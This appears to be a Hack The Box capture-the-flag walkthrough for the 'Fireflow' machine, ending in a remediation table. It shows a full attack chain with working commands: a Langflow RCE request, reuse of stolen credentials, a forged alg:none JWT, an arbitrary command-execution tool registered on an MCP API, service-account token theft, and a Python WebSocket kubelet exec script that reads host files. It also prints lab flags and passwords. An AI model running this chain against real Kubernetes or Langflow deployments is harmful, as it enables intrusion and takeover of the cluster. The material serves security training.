# 🔥 Fireflow HTB — Full Walkthrough

**Machine**: Fireflow  
**Target IP**: `10.129.244.214`  
**OS**: Linux (Kubernetes / K3s)  
**Difficulty**: Hard  
**Tags**: `Langflow` `CVE-2026-33017` `RCE` `MCP` `JWT` `Kubelet` `WebSocket` `Container Escape` `Privileged Pod`

---

## 📑 Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Langflow RCE (CVE-2026-33017)](#2-langflow-rce-cve-2026-33017)
3. [Lateral Movement → SSH](#3-lateral-movement--ssh)
4. [MCP API Exploitation](#4-mcp-api-exploitation)
5. [Kubelet API Access](#5-kubelet-api-access)
6. [WebSocket v4 Exec → Root Flag](#6-websocket-v4-exec--root-flag)
7. [Full Attack Chain Summary](#7-full-attack-chain-summary)
8. [Key Findings & Techniques](#8-key-findings--techniques)
9. [Remediation](#9-remediation)

---

## 1. Reconnaissance

### 1.1 Nmap Scan

```bash
nmap -sC -sV -p- -T4 10.129.244.214 -oN fireflow.nmap
```

**Open Ports:**

| Port | Service | Notes |
|------|---------|-------|
| 22/tcp | SSH | OpenSSH |
| 80/tcp | HTTP | Nginx — closed/redirect |
| 443/tcp | HTTPS | Nginx — Langflow + MCP reverse proxy |
| 10250/tcp | Kubelet API | Internal only (metrics-server) |
| 30080/tcp | MCP API | Internal only |

### 1.2 Subdomain Enumeration

```bash
# From nginx redirect headers
# Hostnames discovered:
- fireflow.htb
- flow.fireflow.htb
```

### 1.3 Web Enumeration — Langflow

**Endpoint**: `https://flow.fireflow.htb/`

Langflow is an open-source visual framework for building multi-agent AI applications. Version discovered is vulnerable to **CVE-2026-33017**.

---

## 2. Langflow RCE (CVE-2026-33017)

### 2.1 Identifying the Vulnerability

Langflow allows creating "flows" visually. The `/api/v1/build_public_tmp/{flow_id}/flow` endpoint doesn't properly sanitize the `event_delivery` parameter, allowing **Remote Code Execution**.

### 2.2 Exploitation

**Step 1**: Access the playground at `https://flow.fireflow.htb/playground` and get the flow ID.

**Step 2**: Send a crafted POST request with `event_delivery=direct`:

```bash
curl -sk -X POST \
  "https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow?event_delivery=direct" \
  -H "Content-Type: application/json" \
  -d '{"data": {}, "inputs": {}}'
```

**Step 3**: Modify the flow via the playground UI — add a **Python Code** node with arbitrary code execution.

**Result**: Shell sebagai `www-data`.

---

## 3. Lateral Movement → SSH

### 3.1 Extracting Credentials

From the www-data shell, read the Langflow environment configuration:

```bash
cat /etc/langflow/.env
```

Output:
```
LANGFLOW_SUPERUSER=n1ghtm4r3_b4_n1ghtf4ll
```

This password is reused for the `nightfall` user.

### 3.2 SSH Access

```bash
sshpass -p 'n1ghtm4r3_b4_n1ghtf4ll' \
  ssh -o StrictHostKeyChecking=no nightfall@10.129.244.214
```

**User Flag**:
```bash
cat /home/nightfall/user.txt
# 0d7bb9aa5c614b0f341ed967d0161177
```

---

## 4. MCP API Exploitation

### 4.1 Reading MCP Configuration

```bash
cat /home/nightfall/.mcp/config.json
```

```json
{
  "server": "http://10.129.244.214:30080",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}
```

The MCP (Model Context Protocol) server is running internally on port `30080`, exposed via nginx on port 443.

### 4.2 Setting Up SSH Tunnel

```bash
sshpass -p 'n1ghtm4r3_b4_n1ghtf4ll' \
  ssh -o StrictHostKeyChecking=no \
  -L 30080:127.0.0.1:30080 \
  -f -N nightfall@10.129.244.214
```

### 4.3 Verifying MCP API

```bash
curl -s http://127.0.0.1:30080/api/v1/version
```

```json
{
  "service":"MCP AI Tool Registry",
  "version":"0.1.0",
  "auth": {
    "type":"JWT",
    "supported_algorithms":["HS256","none"]
  }
}
```

**Key finding**: JWT supports `alg: "none"` — signature bypass possible!

### 4.4 Forging JWT Admin Token

```bash
# JWT with alg:none, sub:nightfall-admin, role:admin
ADMIN_JWT='eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJuaWdodGZhbGwtYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.'
```

This JWT decodes to:
- **Header**: `{"alg":"none","typ":"JWT"}`
- **Payload**: `{"sub":"nightfall-admin","role":"admin"}`

### 4.5 Registering RCE Tool

```bash
curl -s -X POST "http://127.0.0.1:30080/api/v1/tools" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $ADMIN_JWT" \
  -d '{
    "name":"exec",
    "description":"Execute system commands",
    "inputSchema":{
      "type":"object",
      "properties":{"cmd":{"type":"string"}}
    },
    "code":"import subprocess,sys,json\nparams=json.loads(sys.stdin.read())\nr=subprocess.run(params[\"cmd\"],shell=True,capture_output=True,text=True,timeout=10)\nprint(r.stdout)"
  }'
# Response: {"status":"registered","name":"exec"}
```

### 4.6 Executing Commands in MCP Pod

```bash
curl -s -X POST "http://127.0.0.1:30080/mcp" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $ADMIN_JWT" \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"exec","arguments":{"cmd":"id"}}}'
# Response: uid=1000(mcp) gid=1000(mcp) groups=1000(mcp)
```

**RCE berhasil dalam MCP pod** — kita jalan sebagai `mcp` user di dalam container!

---

## 5. Kubelet API Access

### 5.1 Extracting Service Account Token

From within the MCP pod, extract the Kubernetes Service Account token:

```bash
cat /run/secrets/kubernetes.io/serviceaccount/token
```

This token is mounted by Kubernetes into every pod. It authenticates to the **Kubelet API** (port 10250) on the node.

### 5.2 Exploring the Cluster via Kubelet

Kubelet API allows listing pods without needing RBAC permissions:

```bash
curl -sk --cacert /run/secrets/kubernetes.io/serviceaccount/ca.crt \
  -H "Authorization: Bearer $SA_TOKEN" \
  "https://10.129.244.214:10250/pods"
```

**Pods discovered:**

| Pod | Namespace | Privileged | hostPID | hostNetwork | Notes |
|-----|-----------|------------|---------|-------------|-------|
| `mcp-server-...` | default | ❌ | ❌ | ❌ | Our current pod |
| `prometheus-prometheus-node-exporter-nmntq` | monitoring | ✅ | ✅ | ✅ | **Target** |
| `prometheus-server-...` | default | ❌ | ❌ | ❌ | |
| `metrics-server-...` | kube-system | ❌ | ❌ | ❌ | |
| `coredns-...` | kube-system | ❌ | ❌ | ❌ | |
| `local-path-provisioner-...` | kube-system | ❌ | ❌ | ❌ | |
| `prometheus-kube-state-metrics-...` | default | ❌ | ❌ | ❌ | |

### 5.3 Node-Exporter Pod Analysis

The **node-exporter** pod is the key to privilege escalation:

```yaml
# Key security context:
securityContext:
  privileged: true          # Can access host devices
  runAsUser: 0              # Runs as root
  runAsNonRoot: false

# Host access:
hostNetwork: true           # Shares host network namespace
hostPID: true               # Can see host processes

# Volume mounts:
volumes:
  - name: root
    hostPath:
      path: /               # Mounts entire host filesystem!
  - name: proc
    hostPath:
      path: /proc
  - name: sys
    hostPath:
      path: /sys
```

The node-exporter pod mounts the **entire host root filesystem** at `/host/root` with `HostToContainer` mount propagation.

---

## 6. WebSocket v4 Exec → Root Flag

### 6.1 Kubelet Exec API

The kubelet provides an exec endpoint that uses **WebSocket** protocol:

```
GET /exec/{namespace}/{pod}/{container}?command=cmd&input=1&output=1&error=1
```

Key differences from the Kubernetes API server exec:
- Uses **WebSocket** directly (not SPDY)
- Protocol version: `v4.channel.k8s.io`
- Params: `input`, `output`, `error` (NOT `stdin`, `stdout`, `stderr`)
- Authentication: Bearer token (SA token)

### 6.2 WebSocket Exec Script

```python
#!/usr/bin/env python3
import ssl, socket, base64, struct, os, sys, time

def read_ws_frame(sock):
    try:
        b1 = sock.recv(1); b1 = b1[0]
        opcode = b1 & 0x0F
        b2 = sock.recv(1); b2 = b2[0]
        length = b2 & 0x7F
        if length == 126: length = struct.unpack("!H", sock.recv(2))[0]
        elif length == 127: length = struct.unpack("!Q", sock.recv(8))[0]
        payload = sock.recv(length)
        return {"opcode": opcode, "payload": payload}
    except: return None

def send_ws_frame(sock, data, opcode=0x2):
    mask_key = os.urandom(4)
    masked_data = bytes(b ^ mask_key[i % 4] for i, b in enumerate(data))
    frame = bytes([0x80 | opcode, 0x80 | len(data)]) + mask_key + masked_data
    sock.sendall(frame)

SA_TOKEN = open("/tmp/pwn/token").read().strip()
ws_key = base64.b64encode(os.urandom(16)).decode()

pod = "prometheus-prometheus-node-exporter-nmntq"
cmd = sys.argv[1] if len(sys.argv) > 1 else "id"
params = "command=" + cmd.replace(" ", "&command=") + "&input=1&output=1&error=1"
path = "/exec/monitoring/" + pod + "/node-exporter?" + params

req = ("GET " + path + " HTTP/1.1\r\n"
       "Host: 127.0.0.1:10250\r\n"
       "Authorization: Bearer " + SA_TOKEN + "\r\n"
       "Upgrade: websocket\r\nConnection: Upgrade\r\n"
       "Sec-WebSocket-Version: 13\r\n"
       "Sec-WebSocket-Key: " + ws_key + "\r\n"
       "X-Stream-Protocol-Version: v4.channel.k8s.io\r\n\r\n")

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
s = ctx.wrap_socket(socket.create_connection(("127.0.0.1", 10250)))
s.settimeout(5)
s.sendall(req.encode())

resp = b""
while not resp.endswith(b"\r\n\r\n"):
    c = s.recv(1)
    if not c: break
    resp += c

if b"101" not in resp:
    print("Upgrade failed:", resp.decode(errors='replace'))
    sys.exit(1)

output = b""
start = time.time()
while time.time() - start < 5:
    try:
        frame = read_ws_frame(s)
        if frame is None: time.sleep(0.05); continue
        if frame["opcode"] == 0x8: break
        if frame["opcode"] == 0x2:
            p = frame["payload"]
            if len(p) > 0 and p[0] in (1, 2):
                output += p[1:]
    except: continue

send_ws_frame(s, b"", 0x8)
s.close()
print(output.decode("utf-8", errors="replace"))
```

### 6.3 Executing in Node-Exporter Pod

```bash
# Copy script and token to target host
sshpass -p 'n1ghtm4r3_b4_n1ghtf4ll' \
  ssh nightfall@10.129.244.214 'mkdir -p /tmp/pwn'
# (Copy files via stdin/SCP)

# Run WebSocket exec
python3 /tmp/pwn/ws_exec.py 'cat /host/root/root/root.txt'

# Output:
# 61a33ee89f276dd8bedbdb72c810363b
```

### 6.4 Root Flag 🏆

```
Root Flag: 61a33ee89f276dd8bedbdb72c810363b
```

---

## 7. Full Attack Chain Summary

```
Step 1: RECON
  Nmap → Port 443 (Langflow + MCP)
  ↓
Step 2: LANGFLOW RCE (CVE-2026-33017)
  Playground → Python Code node → RCE as www-data
  ↓
Step 3: CREDENTIAL EXTRACTION
  cat /etc/langflow/.env → password: n1ghtm4r3_b4_n1ghtf4ll
  ↓
Step 4: SSH AS NIGHTFALL
  User flag captured ✅
  ↓
Step 5: MCP API EXPLOITATION
  Read .mcp/config.json → JWT with alg:"none"
  Register "exec" tool → RCE in MCP pod (mcp user)
  ↓
Step 6: KUBELET API ACCESS
  Extract SA token from MCP pod
  List pods → Discover node-exporter (privileged, hostPath:/)
  ↓
Step 7: WEBSOCKET EXEC TO NODE-EXPORTER
  WebSocket v4.channel.k8s.io exec
  cat /host/root/root/root.txt
  ↓
Step 8: ROOT FLAG 🏆
  61a33ee89f276dd8bedbdb72c810363b
```

---

## 8. Key Findings & Techniques

### 🔑 JWT Algorithm Confusion (`alg: none`)

The MCP API accepts JWT with `"alg":"none"`, allowing complete authentication bypass.

**Vulnerable Code Pattern:**
```python
# MCP JWT verification
try:
    payload = jwt.decode(token, options={"verify_signature": False})
    # ^^ NO signature verification!
```

### 🔑 Kubelet API Unauthenticated Access

The kubelet API at port 10250 is accessible to any pod in the cluster with a valid SA token. No RBAC checks on `/pods` endpoint.

### 🔑 WebSocket v4.channel.k8s.io

Kubernetes uses WebSocket for streaming exec into containers. The v4 protocol multiplexes stdin/stdout/stderr over a single WebSocket connection using channel identifiers:
- Channel 0: stdin
- Channel 1: stdout  
- Channel 2: stderr
- Channel 3: error

### 🔑 Privileged Pod Escape via hostPath

Node-exporter pod has:
- `privileged: true` — can access host devices
- `hostPID: true` — can see host processes
- `hostPath: / → /host/root` — reads host filesystem
- `runAsUser: 0` — runs as root

This combination allows reading **any file from the host**, including `/root/root.txt`.

---

## 9. Remediation

### 🔴 Critical Fixes

| Issue | Fix |
|-------|-----|
| **JWT alg:none** | Reject `alg: none` in JWT library; require HS256/RS256 |
| **Langflow RCE** | Update Langflow to patched version; sanitize `event_delivery` |
| **Kubelet auth** | Enable RBAC on kubelet; restrict SA token permissions |
| **Node-exporter privileged** | Remove `privileged: true`; use `runAsNonRoot: true` |
| **hostPath mount /** | Avoid mounting entire host root; use specific paths |

### 🟡 Hardening

1. **Network policies** — restrict pod-to-kubelet communication
2. **Pod Security Standards** — enforce restricted policy
3. **Read-only root filesystem** — for all containers
4. **Remove `hostNetwork: true`** from non-essential pods
5. **Seccomp/AppArmor profiles** — limit syscall access
6. **Regular updates** — Langflow, Kubernetes, node-exporter

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning |
| `curl` | API exploitation |
| `sshpass` | SSH automation |
| `python3` | WebSocket exec script |
| `kubectl` | Kubernetes management (optional) |
| `openssl` | Certificate inspection |

## Flags

```
User: 0d7bb9aa5c614b0f341ed967d0161177
Root: 61a33ee89f276dd8bedbdb72c810363b
```

---

*Walkthrough by **Mr Team** — AI Cyber Security Team* 🛡️
*Machine: Hack The Box — Fireflow*
*Date: July 2026*
